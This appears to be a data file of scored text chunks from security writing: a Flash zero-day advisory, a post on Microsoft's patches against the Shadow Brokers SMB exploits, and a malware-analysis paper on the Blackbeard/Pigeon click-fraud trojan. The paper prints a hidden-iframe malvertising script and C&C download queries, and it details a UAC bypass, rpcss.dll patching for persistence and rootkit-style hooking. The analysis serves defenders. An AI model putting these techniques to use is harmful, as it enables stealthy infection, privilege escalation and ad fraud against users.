"Update: 10/16
The Flash zero-day was actually reported by a Google engineer two weeks prior to it being found in the wild. Natalie Silvanovich from Google Project Zero initially posted a report on Sept 29th.
– –
A new Flash Player zero-day has been found in the wild and is being used in targeted attacks. Adobe has published a security bulletin and said it expects to release a patch during the week of October 19.",0.014617783818624552
"The vulnerability which has been assigned as CVE-2015-7645 is rated critical and affects Adobe Flash Player 19.0.0.207 and earlier versions.
This means that even if you are running the latest version of this program, you are still vulnerable and can get infected by simply browsing the web, even on sites that you trust.
2015 has been a very bad year for the Flash Player and given that a patch won’t be available for several more days it is crucial to take immediate action to protect yourself. Indeed, this window of opportunity is something that exploit kit authors have taken advantage of in the past to infect scores of end users
Now is the time for you to seriously consider disabling or removing the Flash Player from your browser. For those that can’t do without it (many sites still require it), we strongly recommend that you use an exploit mitigation tool such as Malwarebytes Anti-Exploit.
We will keep you posted of further developments on this new zero-day.
",0.010325300326836095
Microsoft patch legacy systems against further Shadow Brokers exploits,0.008402708282982285
"Microsoft Security Advisory 4025685 [1] was released on Tuesday 13 June 2017 and quickly gathered a large amount of attention for fixing a significant number of SMB exploits in supported versions of Windows and for Microsoft's decision, once again, to provide patches for now-unsupported versions of their operating systems.",0.011398816751283514
"Microsoft Security Advisory 4025685 [1] was released on Tuesday 13 June 2017 and quickly gathered a large amount of attention for fixing a significant number of SMB exploits in supported versions of Windows and for Microsoft's decision, once again, to provide patches for now-unsupported versions of their operating systems.
While Microsoft rate the SMB vulnerabilities as Important rather than Critical, it should be borne in mind that vulnerabilities within network services such as these are inherently 'wormable' as demonstrated by WannaCry's rapid spread via the exploitation of an SMB vulnerability just last month (see our previous blog for a breakdown of how this propagation worked). This type of propagation method is particularly effective once malware is present within organisations, as systems such as firewalls and intrusion prevention systems are typically deployed on the boundary and are rarely used to monitor and block traffic between internal devices.
Older Versions & The Shadow Brokers Exploits
As noted above, Microsoft have repeated last months unusual decision to provide a patch for versions of their operating systems no longer in support including Windows XP, Windows Server 2003, and Windows Vista. Again, this decision is likely in part down to the requirement to patch older systems such as these against the MS17-010 SMB vulnerability (EternalBlue) during last month's WannaCry outbreak.
However, also patched on these older systems are the three remaining exploits previously released by the Shadow Brokers: EnglishmanDentist (CVE-2017-8487), EsteemAudit (CVE-2017-0176), and ExplodingCan (CVE-2017-7269). Microsoft had previously left these vulnerabilities un-patched as they were found not to affect any currently support versions of Windows.",0.012826510051130335
"Comment: The reason for patching these vulnerabilities and further rolling a number of other patches up for older platforms is unclear and represents an historically unusual decision, potentially suggesting that Microsoft have reason to believe that malicious actors are planning a campaign using one of the three leaked vulnerabilities listed above. While critical systems in major organisations are unlikely to be running on older versions of Windows, compromised systems are frequently used as staging points and relays in larger scale attacks.
The ExplodingCan exploit, for example, allows remote code execution on servers running IIS6.0 (typically Windows Server 2003 systems) with WebDAV enabled. Research conducted in March 2017 [2] suggested that approximately 60,000 devices globally are likely vulnerable to this exploit. With exploit code for this particular vulnerability having been published around the same time, this vulnerability presents a significant attack surface, especially for an actor seeking to build infrastructure for attacks against more valuable targets.",0.012373677267563776
"Conclusion
While there is no currently active attack on the scale of WannaCry, recommendations are in line with the advice given during the earlier outbreak:",0.009990208875321982
"Ensure that these and any other security updates are installed in a timely manner - it should be borne in mind that a patch for the vulnerability used by WannaCry had been available for nearly eight weeks at the time of the outbreak. Note that older systems for which patches have been provided but which are outside of Microsoft's official support period will not automatically update and require manual installation of the patches.
Ensure that you have email and web security that can block malicious emails, block intermediate download stages with Real Time Security Signatures (RTSS), and provide URL sandboxing for additional protection.
In line with Microsoft's guidance from 2016 [3], customers should consider disabling SMBv1 and other legacy protocols on all Windows systems [4] where this will not negatively impact the function of systems within the environment. If you are a Forcepoint customer please consult the following Knowledge Base Article to identify what course of action may be suitable for your product: https://support.forcepoint.com/KBArticle?id=000012832",0.009736063101405179
"As always, Forcepoint Security Labs will continue to monitor for attacks actively using any of the exploits mentioned above.
References & External Links
[1] https://technet.microsoft.com/en-us/library/security/4025685
[2] https://0patch.blogspot.co.uk/2017/03/0patching-immortal-cve-2017-7269.html
[3] https://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/
[4] https://support.microsoft.com/en-us/help/2696547/how-to-enable-and-disable-smbv1,-smbv2,-and-smbv3-in-windows-vista,-windows-server-2008,-windows-7,-windows-server-2008-r2,-windows-8,-and-windows-server-2012
",0.014613095635081952
"VB2014 paper: Notes on click fraud: American story
2016-01-01",0.011745701347865123
"Peter Kálnai
AVAST Software
,
Czech Republic",0.008962904620646861
"Jaromír  Horejší
AVAST Software
,
Czech Republic
Editor:
Martijn",0.011303365945632526
"Grooten
Abstract
The Blackbeard/Pigeon clickbot follows the path that was previously set by ZeroAccess. It uses a sophisticated method to stay persistent in a victim’s computer. Analysing this kind of threat is not a straightforward task, because the entire process is divided into several stages, running in several different processes and requiring different resources and permissions. In their VB2014 paper, Peter Kálnai and Jaromír Horejší provide an in-depth analysis of the clickbot and its interesting and behavioural aspects.
Copyright © 2014 Virus Bulletin",0.011593693432206176
"Abstract
The estimated beginning of this ‘American’ story is in the middle of 2013. An infection chain runs through a malvertising campaign with Java exploitation and ends up dropping a payload with the filename ‘notepad.exe’. The main goal of almost all instances of this particular threat is to gain revenue from simulated clicking on online advertisements. Only computers in the United States are targeted. The families of trojans dropped as the final payload share many characteristics, such as possessing both 32-bit and 64-bit variants and using sophisticated stealth techniques for persistence. These include variants of the well known Win32/64:Alureon rootkit and the Win32/64:Blackbeard downloader that was rediscovered at the turn of the year. With this level of complexity, the trojans continue the trend set by one of the most sophisticated threats to perform click fraud, namely Win32/64:ZeroAccess/Sirefef.
In this paper we focus on the in-depth analysis of these Windows executables and their interesting structural and behavioural aspects. This involves explaining methods that fulfil the need for elevated privileges, the 32-bit to 64-bit code execution switch if executed in a 64-bit environment, and a description of the communication protocol. Moreover, we will provide an overall comparison of clickbot modules of all mentioned threats and discuss the similarities and the differences in the code they use.",0.013145519107677694
"1. Introduction
At the beginning of 2014, a trojan that had previously not been discussed much (with a brand new final payload) started to appear in the wild. It was remarkable in many interesting ways: it possessed a complex structure containing both 32-bit and 64 bit code; its persistence was secured through highly invasive methods; and it displayed a robustness in its ability to contain additional payloads and modules. After a brief investigation of PE header characteristics, a very similar sample from February 2012 was found, which contained debug info with the string ‘Blackbeard’. This led to the nickname of the threat. It is common to find that if a threat contains more advanced features, then its distribution paths also switch from trivial social engineering methods to code execution based on exploitation. Indeed, the data from an internal telemetry system suggested a traffic redirection behind a particular Java exploitation selecting victims exclusively in the United States.
Figure 1. The sample contained debug info with the string ‘Blackbeard’.",0.009107225600860747
"2. Distribution
The infection chain starts with malvertising, where malicious redirection is incorporated into the script code of an infected advertisement. A malicious Java applet is loaded, which creates and drops the notepad.exe file into the %TEMP% directory. The suspected malvertising code is JavaScript, as shown in Listing 1. An iframe with very small dimensions is injected via the document.writeln method. The same chain of exploitation has been observed and reported in [1], [2].
<script type=”text/javascript”>
{
var dz=document;dz.writeln(“<style>#___r___yw {visibility:hidden;}
</style>
<iframe src=\”http://
<url>/uvxj/etkz.php?endovenafsl=<data>&br=0920899\” marginwidth=\”0\” width=\”13\” height=\”12\” id=___r___yw hspace=\”0\” vspace=\”0\”  marginheight=\”0\” scrolling=\”no\” frameborder=\”0\”>
</IFRAME>”);
}
</script>",0.0076754964351150035
Listing 1: The suspected malvertising code is JavaScript.,0.016575570504724357
"3. Structure and behaviour
In the subsections 3.2 and 3.3 the mentioned memory addresses implicitly refer to the Blackbeard sample 3B2DBA499FC805C363F91940FDAC01D376F7F93F958CADC249F456DD239C78C2.",0.013913220329901055
"3.1 Binary structure
Since the early version of the downloader (from February 2012), we have observed the evolution of its structure. The variant described in early 2014 [3] distributed its own trojan features via drive-by download. The binary layout of the first stage starts with an x86 downloader, followed by procedures responsible for the x86 UAC privilege elevation, an x64 downloader and x64 UAC procedures. This downloader then requests the second stage, containing the debug string ‘Pigeon’. This is the main module, which contains x86/x64 code, the rpcss.dll inject and C&C domain list, and is responsible for downloading clickbot modules (the third stage).
The latest variant of the Blackbeard downloader, which lacks the drive-by download feature, was discovered in April 2014. The code corresponding to the previous second stage is embedded and packed with LZO compression [4] in the body of the binary. The clickbot module might or might not be embedded at the end of the binary and encrypted with the same 32-bit RC4 cipher. This altered variant can use a different final payload (e.g. a proxy client) and it can be distributed by a different exploitation chain (in countries outside of the USA). All the parts of the malware – the downloader, Pigeon and the clickbot modules – are included in one binary package. Their layout is shown in Figure 2. It is interesting to note that the Pigeon module is compressed with LZO compression and the clickbot modules are encrypted with the RC4 algorithm with a hard-coded 32-bit key.
Figure 2. Evolution of the Blackbeard/Pigeon structure.
(Click here to view a larger version of Figure 2.)",0.013402962034893662
"3.2 32-bit to 64-bit transition
As is the case with almost all high-profile malware, the first stage is custom packed with a cryptor. After extracting the proper downloader, we can see that it is written in a robust way. The same code can be run in either a 32-bit or 64-bit environment, which the code itself decides on the fly, based on the entry point of the unpacked layer. The malware authors can therefore encapsulate their downloader in either a 32-bit or 64 bit cryptor and it will be executed in both environments.
At first, we notice a sequence of push, pop, rol, test, jnz instructions. When run in different environments, these instructions produce different results. Depending on the result, a conditional jump is either taken or not taken. These initial instructions run in both 32-bit and 64-bit environments. After the first conditional jump (jnz) there are two branches running in 32-bit and WoW64 64-bit environments, respectively.
Figure 3. The initial instructions run in both 32-bit and 64-bit environments. After the first conditional jump (jnz) there are two branches running in 32-bit and 64-bit environments.
(Click here to view a larger version of Figure 3.)
Under the 64-bit environment, the value 0x40000000 is pushed into the RCX register. Even after rotation by two positions to the left, ECX remains zero (ZF is set), so the conditional jump is not taken, and the 64-bit code is executed. The downloader simply gets its image base, adds the relative virtual address of the 64-bit payload function, and executes it.
Under the 32-bit environment, the value 0x40000000 is pushed into the ECX register, which is then rotated by two positions to the left, causing ECX to hold value 1. The instruction ‘test ecx, ecx’ does not set a zero flag (ZF), so the conditional jump is taken and the 32-bit branch of code is executed.
32-bit applications can be executed on both 32-bit and 64 bit operating systems. The processor architecture is decided by the GetNativeSystemInfo function. The expected result is either 0x00 or 0x09, which stands for PROCESSOR_ARCHITECTURE_INTEL (x86) or PROCESSOR_ARCHITECTURE_AMD64 (x64), respectively.
The wProcessorArchitecture information is compared at address 0x4010e0. Depending on whether the x86 or x64 architecture is detected, the conditional jump at this address decides whether the inWin32 function or the inWoW64 function is executed.
When executing a 32-bit application on a 64-bit operating system, the 32-bit application runs an emulation of a 32-bit operating system, which is called Windows on Windows64 (shortened to WoW64). WoW64 intercepts system calls made by the 32-bit application, converts 32-bit data structures into 64-bit data structures, and invokes 64-bit system calls. After the 64-bit system call has finished, it translates any output data structures from 64-bit back to 32-bit data structures. The WoW64 subsystem is implemented using three dynamic link libraries: Wow64.dll, Wow64win.dll and Wow64cpu.dll. Wow64.dll takes care of translations from 32-bit to 64-bit, Wow64win.dll provides entry points for 32-bit applications, and Wow64cpu.dll switches the processor from 32-bit mode to 64 bit mode. The interesting part of downloader starts at address 0x40112c, where it calls the function at 0x401000.
The called function then resolves base addresses of the three above-mentioned fundamental WoW64 libraries. In addition to these, it also retrieves the virtual address of an important structure from Wow64win.dll – the sdwhwin32JumpTable table.
At 0x40105f, it resolves the address of GDI32!BRUSHOBJ_hGetColorTransform, which is a function that is exported from the gdi32.dll library. The resolved address is stored in the EBX register. Later, at 0x401066, the system call ordinal is extracted from the first instruction of the call.
If we want to get the address of a function in sdwhwin32JumpTable, we first subtract 0x1000 from its ordinal number, then multiply it by eight (in the 64-bit system, each pointer has eight bytes) and add it to the beginning of the sdwhwin32JumpTable. In our case:
0x78bbfae0 + 0x129 * 8 = 0x78bc0428
However, in the analysed downloader, something more stealthy happens. At 0x401083, the address corresponding to BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable is overwritten by a user-specified address (0x40ad70). Figure 4 shows the situation before and after the overwriting has been done.
Figure 4. Before and after the overwriting has been done.
(Click here to view a larger version of Figure 4.)
Next, the instruction ‘call ebx’ is executed at the address 0x40108a, which is supposed to invoke BRUSHOBJ_hGetColorTransform. The instruction flow then continues into the gdi32.dll library (BRUSHOBJ_hGetColorTransform), until it reaches the call to the address stored at fs:[0xc0], which points to the wow64cpu!X86SwitchTo64BitMode function.
The DWORD at address fs:[0x0c0] contains an address with a jump causing a switch to the 64-bit environment (segment 0x33 determines the 64-bit environment). The 64-bit environment starts at wow64cpu!CpupReturnFromSimulatedCode, which contains the call toWow64SystemServiceEx. Before calling Wow64SystemServiceEx, several interesting parameters are passed: 0x7559fae0 is the beginning of sdwhwin32JumpTable in wow64win.dll; 0x129 is an ordinal of BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable; and 0x766e5c55 is the beginning of BRUSHOBJ_hGetColorTransform in gdi32.dll. Inside Wow64SystemServiceEx, the address of BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable is computed and called at 0x755bcf84 (call r12). Instead of the original address, code from the patched address is executed. At this point, a 64-bit payload is executed within the loader. The 64-bit payload begins at address 0x40ad70.
You might wonder why such a complicated transition from 32 bit to 64-bit environment is made. The malware could, of course, run only in the 32-bit environment, and a 64-bit version would not be necessary. However, the malware described is just a downloader and a loader which downloads another payload. Access to 64-bit running processes (e.g. web browsers) is desirable for the payload due to the possibility of easier code injection. Although there have been some hacks [5] which describe how to access the memory of a 64-bit process from a 32-bit process, it is easier to use straightforward 64-bit to 64-bit access.",0.02706046050080535
"3.3 Privilege elevation
Before executing the payload itself, it is important to make sure that it is running with elevated privileges. Without those, the privilege for taking ownership (SeTakeOwnershipPrivilege) cannot be acquired, security permissions for system files cannot be changed, and persistence cannot be established. An important part of the code occurs around the address 0x409a2e. Depending on the function parameters, getDelta can be resolved in four different addresses and later at 0x409a90, calling four different functions. If one function fails, another one is called. The first function (0x409bcc) does nothing special, it just tries to acquire SeTakeOwnershipPrivilege. If the malware is not running with elevated privileges, this function fails. The second function (0x409efc) is more interesting. The system API ShellExecuteW is resolved with the parameter ‘runas’ to run a file with elevated privileges. The code uses the System Preparation tool (sysprep.exe), which is a tool that ‘prepares an installation of Windows for duplication, auditing, and customer delivery.’ Sysprep is an application that needs administrative rights every time it is executed, and it is also a whitelisted UAC application [6]. Whitelisting allows users with lower than administrative rights to run applications with full administrative rights while UAC settings are still set to the highest security.
There is a proof-of-concept for Windows 7 UAC whitelisting [7], which uses the above-mentioned feature. At first, a random DLL library is copied from the %WINDOWS%\System32 folder to the %APPDATA%\Roaming folder under a randomly generated name. The newly copied file is patched and then, with the help of IFileOperation, it is copied into the sysprep directory under the name ‘cryptbase.dll’. When sysprep.exe is executed, it loads the cryptbase.dll library from the System32 directory. If we put a fake cryptbase.dll library into the sysprep directory, it will load the fake library instead of the real one. Sysprep is an elevated process, so everything it loads is also elevated. To bypass UAC on Windows 7, it is necessary to be an administrator. A second function also checks SIDs to make sure an administrator account is present. If it is running under only a standard user account, the second method fails.
The third function (0x4086c0) exploits CVE-2013-3660 [8]. If this function succeeds, a standard user can run programs under administrator privileges.
The last function (0x409c40) tries to run rundll32.exe <random dll>, System1. A random DLL is created with the same method as described for the second function; it is also stored in the same location (%APPDATA%\Roaming).
We have mentioned a few times that a particular system DLL is copied into %APPDATA%\Roaming and patched. The main function of the DLL is overwritten. Instead of its original function, it opens a previously created section object with the downloaded payload and calls its entry point function, which is 0x40ad70. It uses just four imported functions: NtOpenSection, NtMapViewOfSection, NtOpenEvent and NtSetEvent. To resolve the addresses of these imports, references to these libraries are overwritten in the DLL’s import table. Finally, the main function of the library is overwritten.
If an attempt to bypass UAC via the above-mentioned methods is not successful, users may encounter (depending on UAC settings) one or more dialogs. The user is presented with a prompt where important system programs request higher privileges in the following order: File Operation, System Preparation Tool, Windows host process (Rundll32). If the user does not grant the privileges, the infection does not happen. However, if the UAC bypass is successful, the user is infected and no UAC is displayed (no matter what the UAC settings are).",0.024473623748785367
"3.4 Persistence
The initial stage of the downloaded payload establishes persistence on the infected system. Unlike many other pieces of malware which modify registry keys or copy themselves into the Startup folder, we encountered a much stealthier and more complicated form of persistence. Instead of modifying the above-mentioned registry keys, an important system DLL is patched so that the payload is executed every time the operating system starts. Rpcss.dll is the chosen library to be patched. RPCSS stands for Remote Procedure Call System Service, which is a core service of RPC (Remote Procedure Call). This is an important technology for creating distributed client/server programs, running on all Windows machines. It is an important system file, so the malware needs to perform a few steps before being able to overwrite it.
First, it attempts to acquire SeTakeOwnershipPrivilege. This privilege allows it to take ownership of any file. The default owner of rpcss.dll is a user called TrustedInstaller, who is the only one with full access (read, write, execute) to this system file. All other users, including SYSTEM, have only read and execute privileges by default. However, with SeTakeOwnershipPrivilege enabled, the owner of rpcss.dll can be changed to the current user. The malware then creates a new access control list (ACL) with two access control entries (ACE): current user and SYSTEM. This access list is then assigned (using SetNamedSecurityInfoW) to the rpcss.dll file. The result is that there are only two users with read/write/execute access – the current user and SYSTEM. Now it is possible to patch the DLL.
When patching the existing library, the best practice is to locate a block full of zeroes and replace it with executable code. However, the payload related to Blackbeard/Pigeon is more than 100KB, and it is not possible to find such a big block of zeros within rpcss.dll. Rpcss.dll contains only a small stub, which reads, decrypts, and executes the previously encrypted payload from a randomly named file in the %WINDOWS%\System32 directory. The payload is encrypted with a single-byte XOR operation.
If a regular user notices a suspiciously named file in the %WINDOWS%\System32 directory and tries to open the file and read it, access to the file will be revoked, because only the SYSTEM user has the right to do this. Rpcss.dll is executed by SYSTEM, so there is no problem in locating and reading the payload. Under Windows XP, there are two instances of rpcss.dll: one located in %WINDOWS%\System32 and one in %WINDOWS%\System32\DllCache. Both instances must be patched. The loader also disables the Windows File Protection (WFP) mechanism by calling an undocumented API with ordinal 5 from the sfc_os.dll library. SfcFileException [9] should disable WFP on a specific file for one minute.
Rpcss.dll is a dynamic linked library. It is not patched at the entry point of its main function (Dllmain). The malware localizes the gaServiceEntryTable structure and offset where the pointer to KernelServiceMain is stored. The pointer to this function is patched so that it points to the newly inserted block of data.
Figure 5. The malware localizes the gaServiceEntryTable structure and offset where the pointer to KernelServiceMain is stored.
(Click here to view a larger version of Figure 5.)
Figure 6. The pointer to the function is patched so that it points to the newly inserted block of data.
(Click here to view a larger version of Figure 6.)
The patched KernelServiceMain function starts with the getDelta assembly sequence (call $+5, pop), which returns the current address. Then it keeps subtracting 0x1000 until it finds the signature (MZ), which is the base address of the currently loaded library. The Decrypt_string procedure is a simple XOR loop, which decrypts the block of memory with the name of the file with the encrypted payload.
At this point, the malware is persistent on the compromised system. There are no traces of infection in the registry. A standard user may notice randomly named files in the %WINDOWS%\System32 directory, but neither he/she nor even an administrator has access to them (only SYSTEM can access them). Now it is time to spawn an Internet communication thread, download another payload and install it on the compromised system.",0.02017422515889289
3.5 Communication protocol,0.007903472299318648
"3.5.1 Downloading drive-by download payload
When the architecture is finally decided, the downloader performs its main purpose – it downloads a payload from a hard coded site. Listing 2 shows the query.
c8-sky-walk.org/load.php?id=10&p=2&t=0&e=1",0.01222780320714878
Listing 2: Query string.,0.015675086546325545
"In the query, ‘id’ is an identifier of a downloader that calls the query, and ‘p’ can have two values (1 or 2 for the x86 and x64 variants of a module, respectively).
The downloaded content is encrypted and stored with a randomly generated name in the %WINDOWS%\System32 directory, e.g. bqpb.ozz. We observed that the downloaded file was encrypted by the RC4 cipher with a 32-bit key. No user has access to the file, only the system.",0.013561643104914034
"3.5.2 Communication with C&C
Communication with the C&C server is encrypted. The bot first collects system identification data, which is then encrypted using the Microsoft Crypto API Provider.
The initial post always starts with ‘0|’, followed by the system id, which is stored in a randomly created file in %WINDOWS%\System32. ‘p’ is the platform (1=x86, 2=x64); ‘os’ is the operating system name; ‘v’, ‘vc’ and ‘b’ are probably version, subversion and build version respectively; and ‘k’ is a randomly generated key. This information is encrypted before being sent back to the C&C. In the binary, we can see a hard coded blob with the PUBLICKEYSTRUCT structure. Its parameters specify that we deal with PUBLICKEYBLOB (0x06), algorithm CALG_RSA_KEYX (0x0000a400). From the given binary blob, the key must first be imported using CryptImportKey from advapi32.dll. Calling advapi32.dll!CryptEncrypt finishes the task. The system information before encryption is shown in Listing 3.
0|id:a4addcf9PYDuf3lKaD7vSiiyty2YqxqVY6g5935Ic5I7jOE1oK0t9bgJQ9e7Y68H|vp:2|p:1|os:Windows XP Service Pack 3|v:3|vc:1|b:820|k:nwvusjhsotjztutijlollwjansnuywwdje|",0.014582584271947141
"Listing 3: Initial POST request, encrypted with a hard-coded public key.",0.015592330223144324
"The C&C server replies with another encrypted message. From now on, encryption is achieved with RC4, and the password is the previously sent parameter, k.
0|4addcf9IRcJ1ppO88AlK73c0tD01C9Z7|",0.010394613210711112
Listing 4: The first reply from the C&C.,0.01516822660080841
"The second POST request to the C&C server is unencrypted and uses only the previously received hash (value 4addcf9IRcJ1ppO88AlK73c0tD01C9Z7) to request an additional payload. The reply to the second POST request is encrypted with RC4. It contains the main module, which is then decrypted, injected into the svchost.exe process, and executed.
4|-56389870907|124928|1|2|0|MZ      ˙˙  ¸       @          Ř   ş ´ Í!¸LÍ!This program cannot be run in DOS mode.",0.011585824329663263
Listing 5: Module downloaded from the C&C server.,0.011408284528730217
"Listing 5 shows the newly downloaded module (MZ header) and its size in bytes (124,928). One of the downloaded payloads is the Pigeon clickbot module. We also observed one more module, which was the SOCKS5 proxy. In the case of a proxy payload, the infected system serves as a server which performs clicks requested by client machines.",0.014135094891649214
4. Comparison of clickbot modules,0.009711592073914477
"4.1 Pigeon
The Pigeon clickbot is distributed as a DLL file with two exported functions: Start and Stop. When the clicking module is activated, it first needs to hook several system API functions which cause some effects that are noticeable by end-users (e.g. playing sound, displaying message boxes, etc.). The Pigeon clickbot therefore hooks several functions in a few libraries. These functions are shown in Table 1.
ws2_32.dll
GetAddrInfoW, GetAddrInfoExW
user32.dll
MessageBoxW, MessageBoxIndirectW, DialogBoxIndirectParamW, DialogBoxParamW
winmm
waveOutOpen
dsound
DirectSoundCreate
ole32
CoCreateInstance, CoGetClassObject
wininet
HttpSendRequestA, HttpSendRequestW
Table 1. Hooked functions.
Hooking these functions has the effect of a user-mode rootkit. For instance, waveOutOpen silences the waveform-audio output device volume by calling waveOutSetVolume with dwVolume = 0, which means silence. The ole32 functions revoke access to the HKEY_CLASSES_ROOT\CLSID entries belonging to Internet Explorer and Video MP4 Moniker Class (a plug-in used by Internet Explorer to play/stream videos in websites). The wininet functions modify HTTP Accept-Language headers to correspond to the system’s locale settings. DirectSoundCreate prevents the creation and initialization of an object that supports the IDirectSound interface. Messages and dialogs using user32.dll APIs are completely bypassed. The Ws2_32 functions modify the host name (pNodeName) parameter.
Later on, it modifies several keys in the Windows registry. These keys influence the behaviour of the web browser window in specific situations. For example, Pigeon sets ‘HKCU\Software\Microsoft\Internet Explorer\Main\NoNewWindows’ to 1. According to the documentation, setting this entry to 1 blocks the window.open event. A new window becomes an in-place navigation event instead. Setting the value of the ‘Error Dlg Displayed On Every Error’ registry key to ‘no’ disables script error notifications. The clickbot also modifies several keys in the Internet settings zones, ‘Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones’, namely 1400, 1601 and 1803. In the Internet zone, 1400 enables active scripting, 1601 enables the submitting of non-encrypted form data, and 1803 disables file download. The registry key ‘Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION’ is set to the value 0x22b8, which forces IE8 standard mode, and the value ‘MAXHTTPREDIRECTS’ raises the redirection limit of the IE browser.
After all the necessary registry modifications have been made, the clickbot reads a job task. The job task URLs are hard coded in the binary and have the following format:
http://<url1>/task/<number>/;http://<url2>/task/<number>/.",0.01884551591307504
Listing 6: Job task URLs.,0.014769450247969496
"The GET request to one of the above-mentioned click job servers returns several lines of plaintext. The first line is the length of the payload, the second line contains the link to be clicked, user agent, etc. The redirection chain from the initial task URL to the actual advertisement link is shown in Listing 7.
request:
GET /task/3033/ HTTP/1.1
Accept-Language: cs-CZ
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MATP; MATP; VER#7C#80837569566745484877484849)
Host: rummerstain2.com
reply:
cc
http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report|88.198.188.106|8|Mozilla/5.0
(compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
0",0.011897475903937416
Listing 7: Redirection chain from initial task URL to the actual advertisement link.,0.014712367031850082
"Figure 7. The find-everything.info search engine.
Figure 7 shows the find-everything.info search engine, which is an ad redirection server. Querying this server gives another payload pointing to the ad control server. Notice that the user agent string is the same as the string obtained in the task command.
request:
GET /?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Host: find-everything.info
reply:
c2
<body><a id=”lnk” href=”http://88.214.241.192/click?sid=403f00deeffc1d7fdd41b7d3f33695e79a210a39&cid=1”></a></body><script type=”text/javascript”>document.getElementById(“lnk”).click();</script>
0",0.013085780287079407
Listing 8: Querying the find-everything.info server.,0.014902481407709778
"Clicking to the supplied link with a proper referer and user agent causes the HTTP redirection to the ad server itself (Listing 9).
request:
GET /click?sid=403f00deeffc1d7fdd41b7d3f33695e79a210a39&cid=1 HTTP/1.1
Referer: http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Host: 88.214.241.192
reply:
In reply, HTTP Location header then causes one more redirection to
Location: http://delivery.seroads.com/display?p=11095&ad=...4",0.013760403421250844
Listing 9: HTTP redirection to the ad server.,0.016431753773667235
"One more redirection follows, as shown in Listing 10.
request:
GET /display?p=11095&ad=Y...4 HTTP/1.1
Referer: http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Cookie: CLICK=CLICK_16
Host: delivery.seroads.com
reply:
HTTP/1.1 302 Found
Location: http://bakingforlife.tv/r-bakingforlife.html?lp=1&externalID=S-CTM-BFL-US1&subExternalID=sero_11095-22-2",0.01594723662686326
Listing 10: Final redirection.,0.015980575993437274
"The contents of the Location HTTP header show the final destination, with parameters identifying the source of the ad network.
An Internet Explorer window is then started in embedding mode. An invisible browser window is a COM object with CLSID=8856f961-340a-11d0-a96b-00c04fd705a2 (Shell.Explorer.2). This window then navigates to the URL obtained from the task server. To behave more realistically and to simulate human behaviour more accurately, a user simulation thread is spawned. This thread randomly moves the mouse, sets the cursor or clicks. One of the web pages that Pigeon redirects to in its hidden window is shown in Listing 10.",0.01444018862204366
"4.2 Alureon
The Alureon module is very similar to the Pigeon module. The Alureon module does not have Start and Stop exports. It also checks command-line parameters to make sure it is running inside the ‘svchost.exe -netsvcs’ process.
The format of the task URLs are the same (only the URL addresses and task numbers are different), and the incoming reply also has the same format. Alureon’s browser window and user simulation thread are programmed in the same way as Pigeon’s. The Alureon clicker modifies some registry keys at startup, but not the same ones. The Alureon clicker, in addition, contains many calls to the WritePrivateProfileStringA and GetPrivateProfileStringA functions, which read or update configuration information stored in the corresponding ini files. The Alureon and Pigeon modules share a significant portion of code, and were probably coded by the same programmer(s).",0.010190487741791987
"4.3 Wowlik
The Wowlik clickbot module (named module_clk1.20) has a different structure from the previously described modules. It hooks even more APIs than Pigeon and Alureon. In addition to those hooked by Pigeon, it hooks the functions listed in Table 2.
kernel32.dll
CreateProcessInternalW, SetUnhandledExceptionFilter, GetModuleFileNameW
user32.dll
GetCursorPos
ntdll.dll
ZwOpenKey, ZwOpenKeyEx, LdrLoadDll, LdrGetProcedureAddressEx, LdrGetProcedureAddress
shell32.dll
SHGetFolderPathW
Table 2. Additional hooked functions.
Hooking the functions implements a user-mode rootkit. Hooking ntdll functions blocks access to HKEY_CLASSES_ROOT\CLSID entries belonging to Internet Explorer and the audio core API. Hooking SHGetFolderPathW blocks access to the browser history directory and browser cookies directory. GetAddrInfo replaces the searcher URL with a localhost URL when queried for information.
It then randomly chooses one of the hard-coded searchers and one of many hard-coded keywords. For example, the searcher name takes the format: ‘http://<US state name>-searcher.com/?q ={keyword}’, and for the keyword something like ‘low+cost+car+insurance’ might be selected (see Figure 8). In the analysed sample, we had just three searchers and about 550 keywords.
Figure 8. Wowlink randomly chooses one of the hard-coded searchers and one of many hard-coded keywords.
Now it is time to get advertisements to click. This is done by querying the ad links from a link feeder, which is hard coded in the clicker module. The format of the request to the feeder is shown in Listing 11.
http://95.211.231.195/feed?version={version}&sid={aid}&q={keyword}&ref={ref}&ua={ua}&lang={lang}",0.016219841079628594
Listing 11. Request to link feeder.,0.01198628603808527
"Here, ‘version’ is the software version; ‘aid’ is an affiliate ID (taken from the variable ‘aid’ in the configuration file wow.ini); ‘keyword’ is a randomly chosen string; ‘ref’ is a referer formed by the a concatenation of the searcher string and the keyword string; ‘ua’ is a user agent string; and ‘lang’ is language. The reply from the feeder (shown in Listing 12) contains various information – the clickurl parameter is the most relevant for revenue generation.
reply:
<result status=”OK” records=”2” searchRequest=”inner knee pain” processTime=”0.0732”>
<record>
<title><![CDATA[Get The Latest Celebrity and Relationship News @ Cupid’s Pulse!]]></title>
<description><![CDATA[Launched in November 2010, CupidsPulse.com is a one-of-a-kind relationship site that analyses trending celebrity news to provide relatable love advice for singles and couples.]]></description>
<url><![CDATA[http://www.cupidspulse.com/]]></url>
<clickurl><![CDATA[http://46.165.240.227/r/8m8739v3/cfa9eaf4f02606798528293d9bc8dfe4/AA/0]]></clickurl>
<bid>0.0035</bid>
<tag>6921:114625:</tag>
</record>
<record>",0.010950391011623428
"...
</record>",0.012465625133844416
